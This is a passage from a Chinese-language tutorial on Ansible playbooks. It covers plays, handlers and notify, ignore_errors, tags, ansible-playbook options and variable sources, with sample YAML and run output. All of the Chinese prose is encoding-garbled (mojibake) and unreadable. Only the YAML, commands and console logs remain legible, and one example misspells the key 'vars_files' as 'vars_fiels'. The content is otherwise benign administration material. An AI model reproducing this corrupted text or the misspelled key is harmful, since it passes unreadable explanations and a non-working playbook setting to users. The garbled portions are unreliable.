çš„æ–¹å¼ï¼Œå¯ä»¥å°†ç›¸å…³ä»»åŠ¡å’Œå˜é‡ç»„ç»‡åˆ°ä¸€ä¸ªç»“æ„åŒ–çš„ç›®å½•ä¸­ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç®¡ç†å’Œç»´æŠ¤ã€‚\næ€»ä¹‹ï¼ŒPlaybook æ˜¯ Ansible ä¸­å®šä¹‰å’Œç®¡ç†è‡ªåŠ¨åŒ–ä»»åŠ¡çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå®ƒä½¿ä½ èƒ½å¤Ÿä»¥å¯ç»´æŠ¤ä¸”å¯æ‰©å±•çš„æ–¹å¼ç®¡ç†è¿œç¨‹ä¸»æœºä¸Šçš„é…ç½®å’Œæ“ä½œã€‚\n3.1.1 Playbook ç»„æˆ ä¸€ä¸ª playbook(å‰§æœ¬)æ–‡ä»¶æ˜¯ä¸€ä¸ªYAMLè¯­è¨€ç¼–å†™çš„æ–‡æœ¬æ–‡ä»¶ é€šå¸¸ä¸€ä¸ªplaybookåªåŒ…æ‹¬ä¸€ä¸ªplay ä¸€ä¸ª playçš„ä¸»è¦åŒ…æ‹¬ä¸¤éƒ¨åˆ†: ä¸»æœºå’Œtasks. å³å®ç°åœ¨æŒ‡å®šä¸€ç»„ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸ªtaskså®šä¹‰å¥½çš„ä»»åŠ¡åˆ—è¡¨ã€‚ ä¸€ä¸ªtasksä¸­å¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªtaskä»»åŠ¡ æ¯ä¸€ä¸ªTaskæœ¬è´¨ä¸Šå°±æ˜¯è°ƒç”¨ansibleçš„ä¸€ä¸ªmodule åœ¨å¤æ‚åœºæ™¯ä¸­,ä¸€ä¸ªplaybookä¸­ä¹Ÿå¯ä»¥åŒ…æ‹¬å¤šä¸ªplayï¼Œå®ç°å¯¹å¤šç»„ä¸åŒçš„ä¸»æœºæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ Playbookï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡å¤šä¸ª play æ‰§è¡Œä¸åŒä»»åŠ¡ï¼š\n--- # è¿™æ˜¯ä¸€ä¸ª Ansible Playbook ç¤ºä¾‹ï¼Œç”¨äºå±•ç¤ºå¤šä¸ª play çš„ç”¨æ³• # ç¬¬ä¸€ä¸ª playï¼šé…ç½® Web æœåŠ¡å™¨ - name: é…ç½® Web æœåŠ¡å™¨ hosts: web_servers tasks: - name: å®‰è£… Apache yum: name: httpd state: present - name: å¯åŠ¨ Apache æœåŠ¡ service: name: httpd state: started # ç¬¬äºŒä¸ª playï¼šé…ç½®æ•°æ®åº“æœåŠ¡å™¨ - name: é…ç½®æ•°æ®åº“æœåŠ¡å™¨ hosts: db_servers tasks: - name: å®‰è£… MySQL yum: name: mysql-server state: present - name: å¯åŠ¨ MySQL æœåŠ¡ service: name: mysqld state: started åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ª playï¼š\nç¬¬ä¸€ä¸ª play:\nåç§°ï¼šé…ç½® Web æœåŠ¡å™¨ ä¸»æœºï¼šweb_servers ä¸»æœºç»„ ä»»åŠ¡ï¼š å®‰è£… Apache è½¯ä»¶åŒ… å¯åŠ¨ Apache æœåŠ¡ ç¬¬äºŒä¸ª play:\nåç§°ï¼šé…ç½®æ•°æ®åº“æœåŠ¡å™¨ ä¸»æœºï¼šdb_servers ä¸»æœºç»„ ä»»åŠ¡ï¼š å®‰è£… MySQL è½¯ä»¶åŒ… å¯åŠ¨ MySQL æœåŠ¡ æ¯ä¸ª play éƒ½ç‹¬ç«‹æ‰§è¡Œï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸åŒçš„ä¸»æœºç»„ä¸Šæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚åœ¨å¤æ‚çš„åœºæ™¯ä¸­ï¼Œè¿™ç§ç»“æ„å¯ä»¥è®©ä½ æ›´æœ‰æ•ˆåœ°ç®¡ç†å’Œç»„ç»‡è‡ªåŠ¨åŒ–ä»»åŠ¡ã€‚æ³¨é‡Šä¸­æä¾›äº†æ¯ä¸ª play æ‰€æ¶‰åŠçš„æ­¥éª¤å’Œä»»åŠ¡çš„æè¿°ï¼Œä»¥å¸®åŠ©ä½ ç†è§£ Playbook çš„ç»“æ„å’ŒåŠŸèƒ½ã€‚\n2.1.2 Playbook å’Œ Ad-Hoc å¯¹æ¯” Ansible æä¾›äº†ä¸¤ç§ä¸»è¦çš„æ“ä½œæ–¹å¼ï¼šPlaybook å’Œ Ad-Hoc å‘½ä»¤ï¼Œç”¨äºåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»åŠ¡ã€‚ä¸‹é¢æ˜¯å®ƒä»¬ä¹‹é—´çš„è¯¦ç»†å¯¹æ¯”ï¼š\nPlaybook:\næè¿°æ€§æ“ä½œï¼šPlaybook æ˜¯ç”¨ YAML æ–‡ä»¶ç¼–å†™çš„ï¼Œä»¥å£°æ˜æ€§çš„æ–¹å¼æè¿°äº†è¦æ‰§è¡Œçš„ä»»åŠ¡å’Œé…ç½®ã€‚å®ƒæ›´é€‚åˆç”¨äºå¤æ‚çš„ã€é•¿æœŸçš„è‡ªåŠ¨åŒ–ä»»åŠ¡ã€‚\nå¤æ‚æ€§ï¼šPlaybook æ”¯æŒå¤šä¸ªä¸»æœºã€å¤šä¸ªä»»åŠ¡ã€å˜é‡ã€å¾ªç¯å’Œæ¡ä»¶ç­‰å¤æ‚çš„æ“ä½œã€‚å®ƒé€‚åˆç®¡ç†å…¨é¢çš„é…ç½®å’Œéƒ¨ç½²ã€‚\nç»“æ„åŒ–ç»„ç»‡ï¼šPlaybook å…è®¸å°†ä»»åŠ¡ç»„ç»‡æˆé€»è¾‘çš„ playï¼Œæ¯ä¸ª play éƒ½å¯ä»¥åœ¨ç‰¹å®šçš„ä¸»æœºç»„ä¸Šæ‰§è¡Œã€‚è¿™ä½¿å¾—ä»»åŠ¡æ›´åŠ æ¨¡å—åŒ–å’Œå¯æ‰©å±•ã€‚\nå¯ç»´æŠ¤æ€§ï¼šç”±äºå®ƒæ˜¯æ–‡æœ¬æ–‡ä»¶ï¼ŒPlaybook å¯ä»¥è½»æ¾åœ°è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£åŒ–å’Œå…±äº«ã€‚é€‚åˆé•¿æœŸç»´æŠ¤å’Œå›¢é˜Ÿåä½œã€‚\nå˜é‡å’Œæ¨¡æ¿ï¼šPlaybook æ”¯æŒå®šä¹‰å˜é‡å’Œä½¿ç”¨ Jinja2 æ¨¡æ¿ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œä»è€Œå®ç°æ›´é«˜åº¦çš„å¯å®šåˆ¶æ€§ã€‚\nAd-Hoc å‘½ä»¤:\nå³æ—¶æ€§æ“ä½œï¼šAd-Hoc å‘½ä»¤æ˜¯ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œçš„ï¼Œé€‚ç”¨äºå³æ—¶éœ€è¦çš„ã€å•æ¬¡æ€§çš„ä»»åŠ¡ã€‚\nå‘½ä»¤è¡Œæ“ä½œï¼šAd-Hoc å‘½ä»¤æ›´é€‚åˆä¸´æ—¶æ“ä½œï¼Œæ— éœ€ç¼–å†™æˆ–ä¿å­˜æ–‡ä»¶ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œã€‚\nç®€å•ä»»åŠ¡ï¼šå®ƒé€‚åˆæ‰§è¡Œç®€å•çš„ã€å¿«é€Ÿçš„ä»»åŠ¡ï¼Œå¦‚æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€ã€æ‰§è¡Œä¸€æ¬¡æ€§å‘½ä»¤ç­‰ã€‚\nå‘½ä»¤æ¨¡å—ï¼šAd-Hoc å‘½ä»¤ä½¿ç”¨å‘½ä»¤æ¨¡å—æ¥æ‰§è¡Œä»»åŠ¡ï¼Œå®ƒä»¬æ¯” Playbook çš„æ¨¡å—å°‘ï¼ŒåŠŸèƒ½ç›¸å¯¹æœ‰é™ã€‚\néš¾ä»¥ç»´æŠ¤ï¼šç”±äºå‘½ä»¤ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œï¼ŒAd-Hoc å‘½ä»¤çš„å¯è¯»æ€§å·®ï¼Œä¸é€‚åˆé•¿æœŸç»´æŠ¤å’Œè·Ÿè¸ªã€‚\nä¸æ”¯æŒå¤æ‚é€»è¾‘ï¼šAd-Hoc å‘½ä»¤ä¸æ”¯æŒåƒ Playbook ä¸­çš„å¤æ‚é€»è¾‘ã€æ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯ã€‚\né€‰æ‹©é€‚ç”¨åœºæ™¯ï¼š\nå¦‚æœä½ éœ€è¦æ‰§è¡Œå¤æ‚çš„å¤šæ­¥éª¤ä»»åŠ¡ã€é…ç½®ç®¡ç†å’Œè‡ªåŠ¨åŒ–æµç¨‹ï¼Œåº”ä¼˜å…ˆä½¿ç”¨ Playbookã€‚ å¦‚æœä½ éœ€è¦å¿«é€Ÿæ‰§è¡Œä¸€æ¬¡æ€§çš„ä»»åŠ¡ï¼Œä¾‹å¦‚ç³»ç»Ÿè¯Šæ–­ã€å¿«é€Ÿæ£€æŸ¥ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ Ad-Hoc å‘½ä»¤ã€‚ æœ€ç»ˆï¼Œé€‰æ‹© Playbook è¿˜æ˜¯ Ad-Hoc å‘½ä»¤å–å†³äºä½ çš„ä»»åŠ¡éœ€æ±‚ã€å¤æ‚æ€§å’Œé•¿æœŸç»´æŠ¤çš„è¦æ±‚ã€‚\n3.2 Plabook æ ¸å¿ƒç»„ä»¶ å½“æ¶‰åŠ Ansible Playbook çš„ç»„ä»¶æ—¶ï¼Œä»¥ä¸‹æ˜¯æ¯ä¸ªç»„ä»¶çš„ç®€å•ç¤ºä¾‹è¯´æ˜ï¼š\nä¸»æœºæ¸…å•ï¼ˆInventoryï¼‰ç¤ºä¾‹ï¼š ä¸»æœºæ¸…å•æ–‡ä»¶åˆ—å‡ºäº† Ansible å°†è¦ç®¡ç†çš„ä¸»æœºå’Œä¸»æœºç»„ã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä¸»æœºæ¸…å•ç¤ºä¾‹ï¼š\n[web_servers] web1 ansible_host=192.168.1.10 web2 ansible_host=192.168.1.11 [db_servers] db1 ansible_host=192.168.1.20 å˜é‡ï¼ˆVariablesï¼‰ç¤ºä¾‹ï¼š ä½ å¯ä»¥åœ¨ Playbook ä¸­ä½¿ç”¨å˜é‡æ¥è®¾ç½®ä¸åŒçš„å€¼ï¼Œä»¥ä¾¿åœ¨ä¸åŒçš„ç¯å¢ƒä¸­é‡ç”¨é…ç½®ã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å˜é‡ç¤ºä¾‹ï¼š\n--- - name: Example Playbook with Variables hosts: web_servers vars: http_port: 80 tasks: - name: Display HTTP Port debug: msg: \u0026#34;HTTP port is {{ http_port }}\u0026#34; ä»»åŠ¡ï¼ˆTasksï¼‰ç¤ºä¾‹ï¼š ä»»åŠ¡æ˜¯ Playbook ä¸­çš„æ“ä½œå•å…ƒï¼Œç”±æ¨¡å—ç»„æˆã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä»»åŠ¡ç¤ºä¾‹ï¼š\n--- - name: Example Task hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present å¤„ç†é…ç½®ï¼ˆHandlersï¼‰ç¤ºä¾‹ï¼š å¤„ç†é…ç½®ç”¨äºåœ¨ä»»åŠ¡æ‰§è¡Œåè§¦å‘ä¸€äº›æ“ä½œï¼Œé€šå¸¸ç”¨äºé‡æ–°å¯åŠ¨æœåŠ¡æˆ–é‡æ–°åŠ è½½é…ç½®ã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å¤„ç†é…ç½®ç¤ºä¾‹ï¼š\n--- - name: Example Playbook with Handlers hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present notify: - Restart Apache handlers: - name: Restart Apache service: name: httpd state: restarted å‰§æœ¬ï¼ˆPlayï¼‰ç¤ºä¾‹ï¼š å‰§æœ¬ç”±ä¸€ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ç»„æˆï¼Œç”¨äºåœ¨ä¸€ç»„ä¸»æœºä¸Šæ‰§è¡Œæ“ä½œã€‚è¿™æ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªä»»åŠ¡çš„å‰§æœ¬ç¤ºä¾‹ï¼š\n--- - name: Example Play hosts: web_servers tasks: - name: Ensure Apache is installed yum: name: httpd state: present - name: Copy index.html copy: src: /path/to/index.html dest: /var/www/html/ åœ¨æ¯ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘æä¾›äº†ä¸€ä¸ªåŸºæœ¬çš„æ¼”ç¤ºï¼Œè¯´æ˜äº†æ¯ä¸ªç»„ä»¶çš„ç”¨æ³•å’Œä½œç”¨ã€‚è¿™åº”è¯¥æœ‰åŠ©äºä½ æ›´å¥½åœ°ç†è§£ Ansible Playbook çš„ä¸åŒç»„ä»¶ä»¥åŠå®ƒä»¬æ˜¯å¦‚ä½•ä¸€èµ·å·¥ä½œçš„ã€‚\n3.3 Playbook å‘½ä»¤ å‘½ä»¤æ ¼å¼\nansible-playbook \u0026lt;filename.yml\u0026gt; ... [options] å¸¸è§é€‰é¡¹\n--syntax,--syntax-check # è¯­æ³•æ£€æŸ¥,åŠŸèƒ½ç›¸å½“äºbash -n -C --check # æ¨¡æ‹Ÿæ‰§è¡Œ dry run ï¼Œåªæ£€æµ‹å¯èƒ½ä¼šå‘ç”Ÿçš„æ”¹å˜ï¼Œä½†ä¸çœŸæ­£æ‰§è¡Œæ“ä½œ --list-hosts # åˆ—å‡ºè¿è¡Œä»»åŠ¡çš„ä¸»æœº --list-tags # åˆ—å‡º tag --list-tasks # åˆ—å‡º task --limit HOST_NAME # åªé’ˆå¯¹ä¸»æœºåˆ—è¡¨ä¸­çš„ç‰¹å®šä¸»æœºæ‰§è¡Œ -i INVENTORY_PATH, --inventory INVENTORY_PATH # æŒ‡å®šä¸»æœºæ¸…å•æ–‡ä»¶, é€šå¸¸ä¸€ä¸ªé¡¹å¯¹åº”ä¸€ä¸ªä¸»æœºæ¸…å•æ–‡ä»¶ --start-at-task START_AT_TASK # ä»æŒ‡å®š task å¼€å§‹æ‰§è¡Œ, è€Œéä»å¤´å¼€å§‹, START_AT_TASKä¸ºä»»åŠ¡çš„ name -v -vv -vvv # æ˜¾ç¤ºè¿‡ç¨‹ èŒƒä¾‹ï¼šæ‰“å° hello world\n[root@ansible playbooks]# cat hello.yaml --- - hosts: remote gather_facts: no # ä¸æ”¶é›†ç›®æ ‡ä¸»æœºä¿¡æ¯ï¼ŒåŠ å¿«æ‰§è¡Œé€Ÿåº¦ tasks: - name: hello command: echo \u0026#34;hello world!\u0026#34; [root@ansible playbooks]# ansible-playbook hello.yaml ç¤ºä¾‹ï¼š\n# åˆ—å‡º playbook ä¸­çš„ä¸»æœº [root@ansible playbooks]# ansible-playbook hello.yaml --list-hosts playbook: hello.yaml play #1 (remote): remote\tTAGS: [] pattern: [u\u0026#39;remote\u0026#39;] hosts (1): remote # åˆ—å‡º playbook ä¸­çš„ä»»åŠ¡ [root@ansible playbooks]# ansible-playbook hello.yaml --list-tasks playbook: hello.yaml play #1 (remote): remote\tTAGS: [] tasks: hello\tTAGS: [] 3.4 ignore_errors åœ¨ playbook æ‰§è¡Œæ—¶ï¼Œå¦‚æœæŸä¸ª task å‡ºé”™ï¼Œåˆ™åç»­ä»»åŠ¡ä¸ä¼šå†æ‰§è¡Œ\n[root@ansible playbooks]# cat test_ignore.yaml --- - hosts: remote gather_facts: no tasks: - name: task1 command: /bin/false ignore_errors: yes # å¿½ç•¥è¯¥taskçš„æŠ¥é”™ï¼Œç»§ç»­æ‰§è¡Œåç»­ä»»åŠ¡ - name: task2 command: echo \u0026#34;hello world!\u0026#34; - hosts: remote gather_facts: no tasks: - name: task3 command: /bin/false # æ­¤æ­¥éª¤æŠ¥é”™ï¼Œä¸å†æ‰§è¡Œåç»­ä»»åŠ¡ - name: task4 command: echo \u0026#34;END---\u0026#34; #å®é™…è¿è¡Œæ•ˆæœï¼štask4ä¸ä¼šæ‰§è¡Œ [root@ansible playbooks]# ansible-playbook test_ignore.yaml PLAY [remote] *********************************************************************** TASK [task1] ************************************************************************ fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;ansible_facts\u0026#34;: {\u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34;}, \u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.272950\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-23 16:10:01.027320\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-23 16:10:00.754370\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} ...ignoring TASK [task2] ************************************************************************ changed: [remote] PLAY [remote] *********************************************************************** TASK [task3] ************************************************************************ fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.276205\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-23 16:10:02.161360\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-23 16:10:01.885155\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} PLAY RECAP ************************************************************************** remote : ok=2 changed=2 unreachable=0 failed=1 skipped=0 rescued=0 ignored=1 3.5 handlers å’Œ notify Handlers æœ¬è´¨æ˜¯ task list ï¼Œç±»ä¼¼äº MySQL ä¸­çš„è§¦å‘å™¨è§¦å‘çš„è¡Œä¸ºï¼Œå…¶ä¸­çš„ task ä¸å‰è¿°çš„ task å¹¶æ²¡æœ‰æœ¬è´¨ä¸Šçš„ä¸åŒï¼Œåªæœ‰åœ¨å…³æ³¨çš„èµ„æºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šé‡‡å–ä¸€å®šçš„æ“ä½œã€‚\nNotify å¯¹åº”çš„ action åœ¨æ‰€æœ‰ task éƒ½æ‰§è¡Œå®Œæ‰ä¼šæœ€åè¢«è§¦å‘ï¼Œè¿™æ ·å¯é¿å…å¤šä¸ª task å¤šæ¬¡æ”¹å˜å‘ç”Ÿæ—¶æ¯æ¬¡éƒ½è§¦å‘æ‰§è¡ŒæŒ‡å®šçš„æ“ä½œï¼ŒHandlers ä»…åœ¨æ‰€æœ‰çš„å˜åŒ–å‘ç”Ÿå®Œæˆåä¸€æ¬¡æ€§åœ°æ‰§è¡ŒæŒ‡å®šæ“ä½œã€‚\nåœ¨ notify ä¸­åˆ—å‡ºçš„æ“ä½œç§°ä¸º handler ï¼Œä¹Ÿå³ notify ä¸­è°ƒç”¨ handler ä¸­å®šä¹‰çš„æ“ä½œ\næ³¨æ„:\nå¦‚æœå¤šä¸ª task é€šçŸ¥äº†ç›¸åŒçš„handlersï¼Œ æ­¤handlersä»…ä¼šåœ¨æ‰€æœ‰taskç»“æŸåè¿è¡Œä¸€ æ¬¡ã€‚ åªæœ‰ notify å¯¹åº”çš„ task å‘ç”Ÿæ”¹å˜äº†æ‰ä¼šé€šçŸ¥ handlersï¼Œæ²¡æœ‰æ”¹å˜åˆ™ä¸ä¼šè§¦å‘handlers handlers æ˜¯åœ¨æ‰€æœ‰å‰é¢çš„ tasks éƒ½æˆåŠŸæ‰§è¡Œæ‰ä¼šæ‰§è¡Œï¼Œå¦‚æœå‰é¢ä»»ä½•ä¸€ä¸ª task å¤±è´¥ï¼Œä¼šå¯¼è‡´ handler è·³è¿‡æ‰§è¡Œ ç¤ºä¾‹ï¼šæ‰§è¡Œä¸¤ä¸ª handle\n--- - hosts: remote gather_facts: no tasks: - name: task1 command: /bin/true notify: # è§¦å‘ handlers ä¸­çš„ä»»åŠ¡æ‰§è¡Œ - get up - go to school handlers: - name: get up debug: msg: \u0026#34;Get it\u0026#34; - name: go to school debug: msg: \u0026#34;I am going to school\u0026#34; [root@ansible playbooks]# ansible-playbook test.yaml PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* changed: [remote] RUNNING HANDLER [get up] ******************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Get it\u0026#34; } RUNNING HANDLER [go to school] ************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;I am going to school\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=3 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 å¦‚æœæœ‰ä»»æ„ä¸€ä¸ªtask æ‰§è¡Œå¤±è´¥ï¼Œhandlers ä¸­çš„ä»»åŠ¡ä¸ä¼šæ‰§è¡Œï¼ˆå³ä½¿åŠ äº†ignore_errorsï¼‰ï¼Œæ­¤æ—¶å¯ä»¥åŠ ä¸Šforce_handlers: yesæ¥å¼ºåˆ¶æ‰§è¡Œ handlers\n--- - hosts: remote gather_facts: no force_handlers: yes # å¿½ç•¥ä»»ä¸€ task æ‰§è¡ŒæŠ¥é”™ï¼Œç»§ç»­å…¶ä»– task åŠå…¶ handler tasks: - name: task1 command: /bin/true notify: # è§¦å‘ handlers ä¸­çš„ä»»åŠ¡æ‰§è¡Œ - get up - name: task2 command: /bin/false notify: - go to school\t# ç”±äºtask2 æŠ¥é”™ï¼Œä¸ä¼šé€šçŸ¥ç›¸åº”çš„handleræ‰§è¡Œ handlers: - name: get up debug: msg: \u0026#34;Get it\u0026#34; - name: go to school debug: msg: \u0026#34;I am going to school\u0026#34; [root@ansible playbooks]# ansible-playbook test.yaml PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* changed: [remote] TASK [task2] ******************************************************************* fatal: [remote]: FAILED! =\u0026gt; {\u0026#34;changed\u0026#34;: true, \u0026#34;cmd\u0026#34;: [\u0026#34;/bin/false\u0026#34;], \u0026#34;delta\u0026#34;: \u0026#34;0:00:00.273631\u0026#34;, \u0026#34;end\u0026#34;: \u0026#34;2023-08-24 08:52:38.649403\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;non-zero return code\u0026#34;, \u0026#34;rc\u0026#34;: 1, \u0026#34;start\u0026#34;: \u0026#34;2023-08-24 08:52:38.375772\u0026#34;, \u0026#34;stderr\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [], \u0026#34;stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;stdout_lines\u0026#34;: []} RUNNING HANDLER [get up] ******************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Get it\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=2 changed=1 unreachable=0 failed=1 skipped=0 rescued=0 ignored=0 3.6 Playbook ä¸­ä½¿ç”¨ tags Tags â€” Ansible Documentation\né»˜è®¤æƒ…å†µä¸‹ï¼Œansible ä¼šæ‰§è¡Œ playbook ä¸­çš„æ‰€æœ‰ä»»åŠ¡ã€‚æ ¹æ®éœ€è¦ï¼Œå¯ä»¥ç»™æŒ‡å®šçš„ task æŒ‡å®šæ ‡ç­¾ï¼Œå³ tagï¼Œè€Œååœ¨æ‰§è¡Œ playbook æ—¶ï¼Œå¸¦ä¸Šå¯¹åº”çš„ tag ä»¥è¿è¡ŒæŒ‡å®šçš„ taskã€‚\nä¸€ä¸ª task å¯ä»¥æœ‰å¤šä¸ª tag å†…ç½®çš„ tag æœ‰ï¼š taggedï¼Œuntagged å’Œ allï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ä»…è¿è¡Œæœ‰tagï¼Œæ²¡æœ‰tagçš„ä»»åŠ¡å’Œæ‰€æœ‰ä»»åŠ¡ã€‚ èŒƒä¾‹ï¼š\n[root@ansible playbooks]# cat test_tags.yml --- - hosts: remote remote_user: root gather_facts: no tasks: - name: task1 debug: msg: \u0026#34;task1\u0026#34; tags: - tag1 - tag_one - name: task2 debug: msg: \u0026#34;task2\u0026#34; - name: task3 debug: msg: \u0026#34;task3\u0026#34; # åˆ—å‡ºæ‰€æœ‰ tag [root@ansible playbooks]# ansible-playbook test_tags.yml --list-tags playbook: test_tags.yml play #1 (remote): remote\tTAGS: [] TASK TAGS: [tag1, tag_one] # åªè¿è¡Œå¸¦æœ‰ tag1 çš„ task [root@ansible playbooks]# ansible-playbook test_tags.yml -t tag1 PLAY [remote] ****************************************************************** TASK [task1] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task1\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 # åªè¿è¡Œæ²¡æœ‰ tag çš„ task [root@ansible playbooks]# ansible-playbook test_tags.yml -t untagged PLAY [remote] ****************************************************************** TASK [task2] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task2\u0026#34; } TASK [task3] ******************************************************************* ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;task3\u0026#34; } PLAY RECAP ********************************************************************* remote : ok=2 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 # ä¸æ‰§è¡Œæœ‰ç‰¹å®š tag çš„ task [root@ansible playbooks]# ansible-playbook test_tags.yml --skip-tags tag_one # ä¸æ‰§è¡Œæ²¡æœ‰ tag çš„ task [root@ansible playbooks]# ansible-playbook test_tags.yml --skip-tags untagged 3.7 Playbook ä¸­ä½¿ç”¨å˜é‡ åœ¨ Ansible ä¸­ï¼Œsetup æ¨¡å—ç”¨äºæ”¶é›†æœ‰å…³è¿œç¨‹ä¸»æœºçš„å„ç§ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯è¢«ç§°ä¸º \u0026ldquo;facts\u0026rdquo;ã€‚è¿™äº› facts åŒ…æ‹¬æœ‰å…³æ“ä½œç³»ç»Ÿã€ç¡¬ä»¶ã€ç½‘ç»œã€å†…å­˜ã€CPU ç­‰çš„ä¿¡æ¯ï¼Œå¯ä»¥ç”¨äºç¼–å†™æ›´åŠ çµæ´»å’ŒåŠ¨æ€çš„å‰§æœ¬ã€‚ä½¿ç”¨ setup æ¨¡å—å¯ä»¥é€šè¿‡ Ansible æ”¶é›†è¿œç¨‹ä¸»æœºçš„ factsã€‚è°ƒç”¨ playbook æ—¶é»˜è®¤è°ƒç”¨æ­¤æ¨¡å—ï¼Œå¯é€šè¿‡ gather_facts: no æ¥ç¦æ­¢ã€‚\nå˜é‡å‘½ä»¤è§„åˆ™ï¼šç”±å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ç»„æˆä¸”åªèƒ½ä»¥å­—æ¯å¼€å¤´\nå˜é‡è°ƒç”¨æ–¹å¼ï¼šé€šè¿‡ {{ VARIBLE_NAME }} è°ƒç”¨å˜é‡ï¼Œå»ºè®®å˜é‡åå‰ååŠ ç©ºæ ¼ï¼Œä¸”æœ‰æ—¶éœ€è¦ä»¥åŒå¼•å·åŒ…è£¹ â€{{ VARIBLE_NAME }}â€œ ï¼ˆå¦‚ï¼šdebug æ¨¡å—ä¸­ï¼‰\nå˜é‡æ¥æºï¼š\nansible çš„ setup æ¨¡å—æ”¶é›†çš„ facts å˜é‡\né€šè¿‡å‘½ä»¤è¡ŒæŒ‡å®šå˜é‡ï¼Œä¼˜å…ˆçº§æœ€é«˜\nansible-playbook my_playbook.yml -e \u0026#34;my_variable=value\u0026#34; åœ¨ playbook ä¸­å®šä¹‰\n- name: Example Playbook hosts: servers vars: my_var: \u0026#34;Hello, Ansible!\u0026#34; tasks: - name: Display variable debug: var: my_var åœ¨ç‹¬ç«‹çš„YAMLæ–‡ä»¶ä¸­å®šä¹‰ï¼Œç„¶åé€šè¿‡å…³é”®å­— vars_files å¼•å…¥\n- hosts: remote vars_fiels: - my_vars.yml åœ¨ä¸»æœºæ¸…å•æ–‡ä»¶ä¸­å®šä¹‰\nä¸»æœºå˜é‡ï¼š åœ¨ä¸»æœºæ¸…å•ï¼ˆInventoryï¼‰ä¸­å®šä¹‰çš„å˜é‡ï¼Œä¼˜å…ˆçº§é«˜äºç»„å˜é‡\n[my_hosts] host1 my_variable=host_value ç»„å˜é‡ï¼š åœ¨ä¸»æœºæ¸…å•ä¸­çš„ç»„çº§åˆ«å®šä¹‰çš„å˜é‡ã€‚\n[my_group:vars] my_variable=group_value åœ¨é¡¹ç›®ä¸­é’ˆå¯¹ä¸»æœºå’Œä¸»æœºç»„å®šä¹‰\nåœ¨é¡¹ç›®ç›®å½•ä¸‹åˆ›å»º host_vars å’Œ group_vars 